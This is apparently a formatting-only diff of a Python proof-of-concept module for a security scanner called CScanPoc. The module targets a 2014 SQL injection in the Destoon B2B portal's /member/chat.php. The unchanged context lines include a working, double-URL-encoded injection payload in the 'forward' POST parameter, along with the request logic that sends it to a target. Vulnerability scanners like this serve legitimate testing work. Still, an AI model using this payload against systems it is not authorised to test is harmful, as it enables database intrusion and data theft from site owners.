@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Destoon_0003' # 平台漏洞编号，留空
+    vuln_id = 'Destoon_0003'  # 平台漏洞编号，留空
     name = 'Destoon SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-03-18'  # 漏洞公布时间
     desc = '''
         Destoon B2B网站管理系统是一套完善的B2B（电子商务）行业门户解决方案。
@@ -32,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/member/chat.php?touser=admin'
             data = "forward=aaaa%2527),(12345678901234567890123456789012,(select%2574 md5(c)),%2527test2test2%2527,4%25275"
             url = self.target + payload
@@ -47,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
